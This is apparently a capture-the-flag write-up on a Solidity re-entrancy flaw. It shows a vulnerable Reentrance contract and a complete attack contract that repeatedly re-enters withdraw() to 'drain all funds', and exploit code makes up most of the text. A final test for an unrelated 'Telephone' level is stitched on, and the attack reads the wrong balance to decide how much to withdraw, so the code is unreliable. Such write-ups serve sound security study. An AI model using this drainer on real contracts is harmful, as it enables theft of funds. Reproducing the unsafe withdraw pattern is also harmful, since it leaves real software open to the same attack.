# Objective

- Drain all funds from the contract

# Proof of Concept

The contract is vulnerable to re-entrancy attacks. The `withdraw()` function
will send the `_amount` sent in parameter back to `msg.sender`. Since the
sender receives some Ether, it will trigger its `receive()` function which can
in turn call-back the `withdraw()` function from the main contract (thus
re-enter into the function, akin to recursive fns).

**Reentrance.sol**

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            unchecked {
                balances[msg.sender] -= _amount; // unchecked to prevent underflow errors
            }
        }
    }

    receive() external payable {}
}
```


**ReentranceAttack.sol**

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance victimContract;
    uint256 initBalance;

    constructor(address _victimAddress) {
        victimContract = IReentrance(_victimAddress);
    }

    function attack() external payable {
        require(msg.value > 0.01 ether, "!enough ether");
        initBalance = msg.value;

        // Initial setup require a donation to kickstart the attack
        victimContract.donate{value: initBalance}(address(this));
        victimContract.withdraw(initBalance);
    }

    function loopBack() private {
        // Compute remaining balance in the Victim contract
        uint256 remainingBalance = victimContract.balanceOf(
            address(victimContract)
        );

        if (remainingBalance > 0) {
            // Compute minimum amount between Attack contract and Victim contract
            uint256 minAmount = remainingBalance < initBalance
                ? remainingBalance
                : initBalance;
            victimContract.withdraw(minAmount);
        }
    }

    receive() external payable {
        loopBack();
    }
}
```

```solidity
function testTelephoneHack() public {
    TelephoneAttack attackContract = new TelephoneAttack(levelAddress);
    emit log_named_address("tx.origin", tx.origin);
    emit log_named_address("msg.sender", attacker); // vm cheatcode set to attacker
    attackContract.attack();

    assertEq(telephoneContract.owner(), attacker);
}
```
